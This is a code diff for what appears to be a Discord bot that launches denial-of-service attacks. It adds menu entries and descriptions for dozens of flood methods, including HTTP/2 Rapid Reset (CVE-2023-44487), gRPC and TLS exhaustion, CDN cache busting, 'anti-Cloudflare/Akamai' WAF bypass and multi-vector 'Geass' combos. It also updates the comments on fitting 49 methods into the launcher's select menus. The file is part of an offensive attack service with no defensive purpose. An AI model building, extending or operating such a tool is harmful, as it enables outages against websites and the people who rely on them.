@@ -93,7 +93,9 @@ if (!BOT_TOKEN) {
 // ── Method definitions with layer grouping for the select menu ──────────────
 const METHOD_OPTIONS = [
   // ── Geass / Special ────────────────────────────────────────────────────
-  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 40v]",    description: "MAX POWER — 40 vectors: +RapidReset0-RTT+WSBomb+GoawayLoop+SSEExhaust+H3RapidReset(QUIC) on top of all 35 originals", emoji: "👁️" },
+  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 42v]",    description: "MAX POWER — 42 vectors simultâneos: H3-RapidReset(QUIC)+RapidResetUltra+H2-RST+H2-CONT+HPACK+WAF+TLS+gRPC+DNS+...", emoji: "👁️" },
+  { value: "geass-ultima",        label: "🔮 Geass Ultima ∞ [FINAL FORM 9v]", description: "FORMA FINAL — 9 vetores em todas camadas OSI: RapidReset+WAF+H2Storm+AppFlood+TLS+Conn+Pipeline+SSE+UDP", emoji: "🔮" },
+  { value: "bypass-storm",        label: "⚡ Bypass Storm ∞ [3-Phase CF]",    description: "3 fases: TLS Exhaust+ConnFlood → WAF+H2 RST+RapidReset → AppFlood+CacheBust. Anti-Cloudflare/Akamai", emoji: "⚡" },
   // ── L7 Application ─────────────────────────────────────────────────────
   { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
   { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
@@ -138,6 +140,14 @@ const METHOD_OPTIONS = [
   { value: "h2-goaway-loop",      label: "🔄 H2 GOAWAY Loop [5000 cycles/s]",          description: "5000 TLS+H2 teardown/setup cycles/s — forces goroutine alloc+free storm on Go/Java servers",            emoji: "🔄" },
   { value: "sse-exhaust",         label: "📡 SSE Exhaust [18K goroutine hold]",         description: "Opens 18K Server-Sent Events connections simultaneously — holds server threads indefinitely",              emoji: "📡" },
   { value: "h3-rapid-reset",      label: "⚡ H3 Rapid Reset [QUIC RESET_STREAM]",       description: "CVE-2023-44487 via HTTP/3 QUIC (UDP): 3-packet DCID burst → DCID alloc+stream alloc+RST in one dgram",  emoji: "⚡" },
+  // ── Métodos novos (2025-2026) — ainda não listados ──────────────────────
+  { value: "h2-rst-burst",        label: "🌊 H2 RST Burst [CVE-2023-44487]",            description: "HEADERS+RST_STREAM puro — write-path overload sem leitura. Mais agressivo que http2-flood",              emoji: "🌊" },
+  { value: "grpc-flood",          label: "📡 gRPC Flood [Handler Exhaust]",              description: "application/grpc content-type — esgota pool de handlers gRPC, afeta Go/Java/Python gRPC servers",        emoji: "📡" },
+  { value: "h2-storm",            label: "⚡ H2 Storm [6 Sub-Vetores]",                  description: "6 vetores H2 simultâneos: SETTINGS+HPACK+PING+CONTINUATION+DEPENDENCY+DATA — esgota completamente",      emoji: "⚡" },
+  { value: "tls-session-exhaust", label: "🔐 TLS Session Exhaust [RSA CPU]",             description: "Full TLS handshake por conn, sem resumption — satura crypto thread pool do servidor (5× mais que conn-flood)", emoji: "🔐" },
+  { value: "cache-buster",        label: "💨 Cache Buster [100% Origin Hit]",            description: "Cache-Control:no-cache + Vary bombs + query params únicos — 100% miss no CDN, origem sobrecarregada",    emoji: "💨" },
+  { value: "h2-dep-bomb",         label: "🌀 H2 Dep Bomb [O(N²) Priority Tree]",         description: "RFC 7540 §5.3.1 PRIORITY chains exclusivas + RST cascade — O(N²) trabalho no servidor por O(N) frames", emoji: "🌀" },
+  { value: "h2-data-flood",       label: "💧 H2 Data Flood [Window Exhaust]",            description: "DATA frames até zerar window size, força flow-control — servidor fica preso gerenciando buffers",         emoji: "💧" },
 ];
 
 // ── Duration presets ─────────────────────────────────────────────────────────
@@ -1258,10 +1268,10 @@ function startMonitor(attackId: number, editFn: MonitorEditFn, target: string, u
 
 // ── Build launcher embed with all dropdowns ────────────────────────────────────
 // Discord hard-limit: 25 options per select menu, 5 rows per message.
-// 35 methods split: Row1 = first 25, Row2 = remaining 10, Row3 = duration,
-// Row4 = threads, Row5 = Launch/Cancel buttons.
-const METHOD_OPTIONS_A = METHOD_OPTIONS.slice(0, 25); // Geass + L7 + L4 + L3
-const METHOD_OPTIONS_B = METHOD_OPTIONS.slice(25);    // ARES OMNIVECT ∞
+// 49 methods split: Row1 = first 25 (Geass/L7/L4), Row2 = remaining 24 (ARES ∞),
+// Row3 = duration, Row4 = threads, Row5 = Launch/Cancel buttons.
+const METHOD_OPTIONS_A = METHOD_OPTIONS.slice(0, 25); // Geass + L7 + L4 (≤25)
+const METHOD_OPTIONS_B = METHOD_OPTIONS.slice(25);    // ARES OMNIVECT ∞ (≤25)
 
 function buildLauncherComponents(_target: string) {
   // Row 1 — Methods 1-25 (Geass, L7, L4, L3)
